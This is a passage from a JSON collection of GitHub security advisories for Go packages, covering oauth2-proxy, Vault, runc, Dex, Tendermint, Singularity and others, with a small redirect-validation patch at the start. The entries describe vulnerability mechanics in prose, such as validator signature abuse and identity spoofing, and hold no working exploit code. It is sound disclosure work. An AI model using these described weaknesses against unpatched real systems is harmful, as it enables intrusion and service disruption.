<harsh@pop-os.localdomain>\nDate: Fri, 1 May 2020 20:38:31 +0530\nSubject: [PATCH] Fixes redirect issue\n\n---\n oauthproxy.go | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\ndiff --git a/oauthproxy.go b/oauthproxy.go\nindex 1e9bb7c..f8beb4d 100644\n--- a/oauthproxy.go\n+++ b/oauthproxy.go\n@@ -577,8 +577,9 @@ func validOptionalPort(port string) bool {\n\n // IsValidRedirect checks whether the redirect URL is whitelisted\n func (p *OAuthProxy) IsValidRedirect(redirect string) bool {\n+       matched, _ := regexp.MatchString(`^/\\s+/|\\\\`, redirect)\n        switch {\n-       case strings.HasPrefix(redirect, \"/\") && !strings.HasPrefix(redirect, \"//\") && !strings.HasPrefix(redirect, \"/\\\\\"):\n+       case strings.HasPrefix(redirect, \"/\") && !strings.HasPrefix(redirect, \"//\") && !matched:\n                return true\n        case strings.HasPrefix(redirect, \"http://\") || strings.HasPrefix(redirect, \"https://\"):\n                redirectURL, err := url.Parse(redirect)\n--\n2.17.1\n```\n\nThis issue was also reported to us separately by @mik317 several hours later\n\nThe fix was implemented in [#xxx]() and released as version 5.1.1", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/oauth2-proxy/oauth2-proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.1.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/oauth2-proxy/oauth2-proxy/security/advisories/GHSA-j7px-6hwj-hpjg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-11053"}, {"type": "WEB", "url": "https://github.com/oauth2-proxy/oauth2-proxy/commit/0d5fa211df8ef2449347a56b22c779eb8d894c43"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T21:05:58Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-m3fm-h5jp-q79p", "modified": "2023-02-03T20:37:11Z", "published": "2021-12-20T16:58:14Z", "aliases": ["CVE-2016-1906"], "summary": "Authorization bypass in Openshift", "details": "Openshift allows remote attackers to gain privileges by updating a build configuration that was created with an allowed type to a type that is not allowed.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openshift/origin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-1906"}, {"type": "WEB", "url": "https://github.com/openshift/origin/issues/6556"}, {"type": "WEB", "url": "https://github.com/openshift/origin/pull/6576"}, {"type": "WEB", "url": "https://github.com/openshift/origin/commit/d95ec085f03ecf10e8c424a4f0340ddb38891406"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2016:0070"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2016:0351"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2016-1906"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1297916"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-1906"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-19T22:01:34Z", "nvd_published_at": "2016-02-03T18:59:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pfmw-vj74-ph8g", "modified": "2022-08-10T23:48:33Z", "published": "2021-12-02T17:48:30Z", "aliases": ["CVE-2021-43998"], "summary": "HashiCorp Vault Incorrect Permission Assignment for Critical Resource", "details": "HashiCorp Vault and Vault Enterprise 0.11.0 up to 1.7.5 and 1.8.4 templated ACL policies would always match the first-created entity alias if multiple entity aliases exist for a specified entity and mount combination, potentially resulting in incorrect policy enforcement. Fixed in Vault and Vault Enterprise 1.7.6, 1.8.5, and 1.9.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.11.0"}, {"fixed": "1.7.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.0"}, {"fixed": "1.8.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-43998"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-30-vaults-templated-acl-policies-matched-first-created-alias-per-entity-and-auth-backend/32132"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202207-01"}], "database_specific": {"cwe_ids": ["CWE-732"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-12-01T18:25:18Z", "nvd_published_at": "2021-11-30T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-627p-rr78-99rj", "modified": "2021-05-24T17:56:03Z", "published": "2021-12-20T17:56:03Z", "aliases": ["CVE-2020-5415"], "summary": "GitLab auth uses full name instead of username as user ID, allowing impersonation", "details": "### Impact\n\nInstallations which use the GitLab auth connector are vulnerable to identity spoofing by way of configuring a GitLab account with the same full name as another GitLab user who is granted access to a Concourse team by having their full name listed under `users` in the team configuration or given to the `--gitlab-user` flag.\n\nSee the [GitLab auth docs](https://concourse-ci.org/gitlab-auth.html) for details.\n\nConcourse installations which do not configure the GitLab auth connector are not affected.\n\n### Patches\n\nConcourse [v6.3.1](https://github.com/concourse/concourse/releases/tag/v6.3.1) and [v6.4.1](https://github.com/concourse/concourse/releases/tag/v6.4.1) were both released with a fix on August 4th, 2020.\n\nBoth versions change the GitLab connector to use the username, rather than the full name. This was always the intent, and the previous behavior was originally reported as a bug (concourse/dex#7) prior to being reported as a security issue.\n\nAny Concourse teams which configure GitLab users will have to switch each user from their full name to their username upon upgrading to these versions.\n\n### Workarounds\n\nGitLab groups do not have this vulnerability, so GitLab users may be moved into groups which are then configured in the Concourse team.\n\n### References\n\n* concourse/dex#12: PR with the fix\n\n### For more information\n\nIf you have any questions or comments about this advisory, you may reach us privately at [concourseteam+security@gmail.com](mailto:concourseteam+security@gmail.com).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/concourse/concourse"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.4.0"}, {"fixed": "6.4.1"}]}], "versions": ["6.4.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/concourse/concourse"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.3.0"}, {"fixed": "6.3.1"}]}], "versions": ["6.3.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/concourse/dex"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.4.0"}, {"fixed": "6.4.1"}]}], "versions": ["6.4.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/concourse/dex"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.3.0"}, {"fixed": "6.3.1"}]}], "versions": ["6.3.0"]}], "references": [{"type": "WEB", "url": "https://github.com/concourse/concourse/security/advisories/GHSA-627p-rr78-99rj"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-5415"}, {"type": "WEB", "url": "https://tanzu.vmware.com/security/cve-2020-5415"}], "database_specific": {"cwe_ids": ["CWE-290"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-24T17:56:03Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-j96p-r523-8r3w", "modified": "2021-11-24T19:42:20Z", "published": "2021-12-03T20:52:02Z", "aliases": ["CVE-2021-43669"], "summary": "HTTP Request Smuggling in github.com/hyperledger/fabric", "details": "A vulnerability has been detected in HyperLedger Fabric v1.4.0, v2.0.0, v2.0.1, v2.3.0. It can easily break down as many orderers as the attacker wants. This bug can be leveraged by constructing a message whose header is invalid to the interface Order. This bug has been admitted and fixed by the developers of Fabric.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hyperledger/fabric"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.4.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-43669"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/pull/2828"}, {"type": "PACKAGE", "url": "https://github.com/hyperledger/fabric"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/releases/tag/v2.4.0-beta"}, {"type": "WEB", "url": "https://jira.hyperledger.org/browse/FAB-18528"}], "database_specific": {"cwe_ids": ["CWE-444"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-11-24T19:42:20Z", "nvd_published_at": "2021-11-18T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q6gq-997w-f55g", "modified": "2021-06-18T22:05:40Z", "published": "2021-12-16T19:16:40Z", "aliases": ["CVE-2020-16845"], "summary": "Infinite loop in xz", "details": "Go before 1.13.15 and 14.x before 1.14.7 can have an infinite read loop in ReadUvarint and ReadVarint in encoding/binary via invalid inputs.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ulikunitz/xz"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-16845"}, {"type": "WEB", "url": "https://github.com/ulikunitz/xz/issues/35"}, {"type": "WEB", "url": "https://github.com/ulikunitz/xz/commit/69c6093c7b2397b923acf82cb378f55ab2652b9b"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/golang-announce/NyPIaucMgXo"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/golang-announce/_ulYYcIWg3Q"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/11/msg00037.html"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/11/msg00038.html"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6RCFJTMKHY5ICGEM5BUFUEDDGSPJ25XU/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KWRBAH4UZJO3RROQ72SYCUPFCJFA22FO/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TACQFZDPA7AUR6TRZBCX2RGRFSDYLI7O/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WV2VWKFTH4EJGZBZALVUJQJOAQB5MDQ4/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20200924-0002/"}, {"type": "WEB", "url": "https://www.debian.org/security/2021/dsa-4848"}, {"type": "WEB", "url": "https://www.oracle.com/security-alerts/cpuApr2021.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-08/msg00021.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-08/msg00028.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00029.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00030.html"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-06-18T22:05:40Z", "nvd_published_at": "2020-08-06T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q3j5-32m5-58c2", "modified": "2021-10-05T16:34:17Z", "published": "2021-12-20T18:21:34Z", "aliases": ["CVE-2016-3697"], "summary": "Privilege Elevation in runc", "details": "libcontainer/user/user.go in runC before 0.1.0, as used in Docker before 1.11.2, improperly treats a numeric UID as a potential username, which allows local users to gain privileges via a numeric username in the password file in a container.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/runc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-3697"}, {"type": "WEB", "url": "https://github.com/docker/docker/issues/21436"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/pull/708"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/commit/69af385de62ea68e2e608335cffbb0f4aa3db091"}, {"type": "PACKAGE", "url": "https://github.com/opencontainers/runc"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/releases/tag/v0.1.0"}, {"type": "WEB", "url": "https://lists.opensuse.org/opensuse-updates/2016-05/msg00111.html"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0070"}, {"type": "WEB", "url": "https://rhn.redhat.com/errata/RHSA-2016-1034.html"}, {"type": "WEB", "url": "https://rhn.redhat.com/errata/RHSA-2016-2634.html"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/201612-28"}, {"type": "WEB", "url": "http://rhn.redhat.com/errata/RHSA-2016-1034.html"}, {"type": "WEB", "url": "http://rhn.redhat.com/errata/RHSA-2016-2634.html"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T18:53:49Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-jm34-xm8m-w958", "modified": "2021-05-19T22:31:56Z", "published": "2021-12-20T18:04:40Z", "aliases": ["CVE-2017-1000070"], "summary": "Open Redirect in oauth2_proxy", "details": "The Bitly oauth2_proxy in version 2.1 and earlier was affected by an open redirect vulnerability during the start and termination of the 2-legged OAuth flow. This issue was caused by improper input validation and a violation of RFC-6819", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/bitly/oauth2_proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-1000070"}, {"type": "WEB", "url": "https://github.com/bitly/oauth2_proxy/issues/228"}, {"type": "WEB", "url": "https://github.com/bitly/oauth2_proxy/pull/359"}, {"type": "WEB", "url": "https://github.com/bitly/oauth2_proxy/commit/289a6ccf463a425c7606178c510fc5eeb9c8b050"}, {"type": "WEB", "url": "https://tools.ietf.org/html/rfc6819#section-5.2.3.5"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-1000070"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-19T22:31:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-m9hp-7r99-94h5", "modified": "2021-05-21T20:49:36Z", "published": "2021-12-20T17:53:53Z", "aliases": ["CVE-2020-26290"], "summary": "Critical security issues in XML encoding in github.com/dexidp/dex", "details": "### Impact\n\nThe following vulnerabilities have been disclosed, which impact users leveraging the SAML connector:\n\nSignature Validation Bypass (CVE-2020-15216): https://github.com/russellhaering/goxmldsig/security/advisories/GHSA-q547-gmf8-8jr7\n\n`encoding/xml` instabilities:\n - [Element namespace prefix instability (CVE-2020-29511)](https://github.com/mattermost/xml-roundtrip-validator/blob/master/advisories/unstable-elements.md)\n - [Attribute namespace prefix instability (CVE-2020-29509)](https://github.com/mattermost/xml-roundtrip-validator/blob/master/advisories/unstable-attributes.md)\n - [Directive comment instability (CVE-2020-29510)](https://github.com/mattermost/xml-roundtrip-validator/blob/master/advisories/unstable-directives.md)\n\n### Patches\n\nImmediately update to [Dex v2.27.0](https://github.com/dexidp/dex/releases/tag/v2.27.0).\n\n### Workarounds\n\nThere are no known workarounds.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dexidp/dex"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.27.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/russellhaering/goxmldsig"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/dexidp/dex/security/advisories/GHSA-m9hp-7r99-94h5"}, {"type": "WEB", "url": "https://github.com/russellhaering/goxmldsig/security/advisories/GHSA-q547-gmf8-8jr7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26290"}, {"type": "WEB", "url": "https://github.com/dexidp/dex/commit/324b1c886b407594196113a3dbddebe38eecd4e8"}, {"type": "WEB", "url": "https://github.com/russellhaering/goxmldsig/commit/f6188febf0c29d7ffe26a0436212b19cb9615e64"}, {"type": "WEB", "url": "https://github.com/dexidp/dex/releases/tag/v2.27.0"}, {"type": "WEB", "url": "https://github.com/mattermost/xml-roundtrip-validator/blob/master/advisories/unstable-attributes.md"}, {"type": "WEB", "url": "https://github.com/mattermost/xml-roundtrip-validator/blob/master/advisories/unstable-directives.md"}, {"type": "WEB", "url": "https://github.com/mattermost/xml-roundtrip-validator/blob/master/advisories/unstable-elements.md"}, {"type": "WEB", "url": "https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0050"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-21T20:49:36Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-6jqj-f58p-mrw3", "modified": "2022-10-06T21:46:48Z", "published": "2021-12-20T18:17:33Z", "aliases": ["CVE-2020-15091"], "summary": "Denial of Service in TenderMint", "details": "### Description\n\n**Denial of Service**\n\nTendermint 0.33.0 and above allow block proposers to include signatures for the wrong block. This may happen naturally if you start a network, have it run for some time and restart it without changing the chainID. (It is a [misconfiguration](https://docs.tendermint.com/master/tendermint-core/using-tendermint.html) to reuse chainIDs.) Correct block proposers will accidentally include signatures for the wrong block if they see these signatures, and then commits won't validate, making all proposed blocks invalid. A malicious validator (even with a minimal amount of stake) can use this vulnerability to completely halt the network.\n\nTendermint 0.33.6 checks all the signatures are for the block with +2/3 majority before creating a commit.\n\n**False Witness**\n\nTendermint 0.33.1 and above are no longer fully verifying commit signatures during block execution - they stop after +2/3. This means proposers can propose blocks that contain valid +2/3 signatures and then the rest of the signatures can be whatever they want. They can claim that all the other validators signed just by including a CommitSig with arbitrary signature data. While this doesn't seem to impact safety of Tendermint per se, it means that Commits may contain a lot of invalid data **.\n\n_** This was already true of blocks, since they could include invalid txs filled with garbage, but in that case the application knew that they are invalid and could punish the proposer. But since applications didn't--and don't-- verify commit signatures directly (they trust Tendermint to do that), they won't be able to detect it._\n\nThis can impact incentivization logic in the application that depends on the LastCommitInfo sent in BeginBlock, which includes which validators signed. For instance, Gaia incentivizes proposers with a bonus for including more than +2/3 of the signatures. But a proposer can now claim that bonus just by including arbitrary data for the final -1/3 of validators without actually waiting for their signatures. There may be other tricks that can be played because of this.\n\nTendermint 0.33.6 verifies all the signatures during block execution ***.\n\n_*** Please note that the light client does not check nil votes and exits as soon as 2/3+ of the signatures are checked._\n\n### Impact\n\n- All nodes\n- The network stops due to having a commit with a wrong signature.\n\n### Patches\n\n- v0.33.6\n\n### Workarounds\n\nNo workarounds.\n\n### References\n\n- https://github.com/tendermint/tendermint/issues/4926\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [tendermint/tendermint](https://github.com/tendermint/tendermint)\n* Email us at [security@tendermint.com](mailto:security@tendermint.com)\n\nMore information can be found [here](https://tendermint.com/security/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tendermint/tendermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.33.0"}, {"fixed": "0.33.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/tendermint/tendermint/security/advisories/GHSA-6jqj-f58p-mrw3"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15091"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/issues/4926"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/pull/5426"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/commit/480b995a31727593f58b361af979054d17d84340"}, {"type": "PACKAGE", "url": "https://github.com/tendermint/tendermint"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/blob/master/CHANGELOG.md#v0336"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0090"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T20:49:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rrm8-32g4-w8m3", "modified": "2021-05-12T18:30:22Z", "published": "2021-12-20T18:04:46Z", "aliases": ["CVE-2017-1000069"], "summary": "Cross-site Request Forgery (CSRF)", "details": "CSRF in Bitly oauth2_proxy 2.1 during authentication flow", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/bitly/oauth2_proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-1000069"}, {"type": "WEB", "url": "https://github.com/bitly/oauth2_proxy/pull/360"}, {"type": "WEB", "url": "https://github.com/bitly/oauth2_proxy/commit/55085d9697962668fd4e43e8e4644144fe83cd93"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-1000069"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T18:30:22Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-557g-r22w-9wvx", "modified": "2023-02-28T16:47:09Z", "published": "2021-12-20T18:25:33Z", "aliases": ["CVE-2019-11328"], "summary": "Incorrect Permission Assignment for Critical Resource in Singularity", "details": "An issue was discovered in Singularity 3.1.0 to 3.2.0-rc2, a malicious user with local/network access to the host system (e.g. ssh) could exploit this vulnerability due to insecure permissions allowing a user to edit files within `/run/singularity/instances/sing/<user>/<instance>`. The manipulation of those files can change the behavior of the starter-suid program when instances are joined resulting in potential privilege escalation on the host.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/singularity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.1.0"}, {"fixed": "3.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11328"}, {"type": "WEB", "url": "https://github.com/sylabs/singularity/commit/618c9d56802399adb329c23ea2b70598eaff4a31"}, {"type": "WEB", "url": "https://github.com/sylabs/singularity/releases/tag/v3.2.0"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5O3TPL5OOTIZEI4H6IQBCCISBARJ6WL3/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LIHV7DSEVTB5SUPEZ2UXGS3Q6WMEQSO2/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LNU5BUHFOTYUZVHFUSX2VG4S3RCPUEMA/"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-10/msg00028.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00059.html"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2019/05/16/1"}, {"type": "WEB", "url": "http://www.securityfocus.com/bid/108360"}], "database_specific": {"cwe_ids": ["CWE-269", "CWE-732"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T15:50:05Z", "nvd_published_at": "2019-05-14T21:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wxc4-f4m6-wwqv", "modified": "2023-02-09T17:45:10Z", "published": "2021-12-20T16:55:06Z", "aliases": ["CVE-2019-11254"], "summary": "Excessive Platform Resource Consumption within a Loop in Kubernetes", "details": "The Kubernetes API Server component in versions 1.1-1.14, and versions prior to 1.15.10, 1.16.7 and 1.17.3 allows an authorized user who sends malicious YAML payloads to cause the kube-apiserver to consume excessive CPU cycles while parsing YAML.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "gopkg.in/yaml.v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/go-yaml/yaml"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "2.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11254"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/89535"}, {"type": "WEB", "url": "https://github.com/go-yaml/yaml/pull/555"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/87467/commits/b86df2bec4f377afc0ca03482ffad2f0a49a83b8"}, {"type": "WEB", "url": "https://github.com/go-yaml/yaml/commit/53403b58ad1b561927d19068c655246f2db79d48"}, {"type": "WEB", "url": "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=18496"}, {"type": "WEB", "url": "https://groups.google.com/d/msg/kubernetes-announce/ALL9s73E5ck/4yHe8J-PBAAJ"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0036"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20200413-0003/"}], "database_specific": {"cwe_ids": ["CWE-1050"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-07T17:24:04Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-6w7g-p4jh-rf92", "modified": "2023-01-20T22:03:21Z", "published": "2021-12-20T18:24:43Z", "aliases": ["CVE-2020-13846"], "summary": "\"Verify All\" Returns Success Despite Validation Failures in Singularity", "details": "### Impact\n\nThe `--all / -a` option to `singularity verify` returns success even when some objects in a SIF container are not signed, or cannot be verified.\n\nThe SIF objects that are not verified are reported in `WARNING` log messages, but a `Container Verified` message and exit code of `0`  are returned.\n\nWorkflows that verify a container using `--all / -a` and use the exit code as an indicator of success are vulnerable to running SIF containers that have unsigned, or modified, objects that may be exploited to introduce malicious behavior.\n\n```\n$ singularity verify -a image.sif \nWARNING: Missing signature for SIF descriptor 2 (JSON.Generic)\nWARNING: Missing signature for SIF descriptor 3 (FS)\nContainer is signed by 1 key(s):\n\nVerifying partition: Def.FILE:\n12045C8C0B1004D058DE4BEDA20C27EE7FF7BA84\n[LOCAL]   Unit Test <unit@test.com>\n[OK]      Data integrity verified\n\nINFO:    Container verified: image.sif\n\n$ echo $?\n0\n```\n\n\n### Patches\n\nSingularity 3.6.0 has a new implementation of sign/verify that fixes this issue.\n\nAll users are advised to upgrade to 3.6.0. Note that Singularity 3.6.0 uses a new signature format that is necessarily incompatible with Singularity < 3.6.0 - e.g. Singularity 3.5.3 cannot verify containers signed by 3.6.0.\n\nVersion 3.6.0 includes a `--legacy-insecure` flag for the `singularity verify` command, that will perform verification of the older, and insecure, legacy signatures for compatibility with existing containers. This does not guarantee that containers have not been modified since signing, due to other issues in the legacy signature format.\n\n### Workarounds\n\nIf you are unable to update to 3.6.0 ensure that you do not rely on the return code of `singularity verify --all / -a` as an indicator of trust in a container.\n\nNote that other issues in the sign/verify implementation in Singularity < 3.6.0 allow additional means to introduce malicious behavior to a signed container.\n\n\n### For more information\n\nGeneral questions about the impact of the advisory / changes made in the 3.6.0 release can be asked in the:\n\n* [Singularity Slack Channel](https://bit.ly/2m0g3lX)\n* [Singularity Mailing List](https://groups.google.com/a/lbl.gov/forum/??sdf%7Csort:date#!forum/singularity)\n\nAny sensitive security concerns should be directed to: security@sylabs.io\n\nSee our Security Policy here: https://sylabs.io/security-policy", "severity": [{"type": 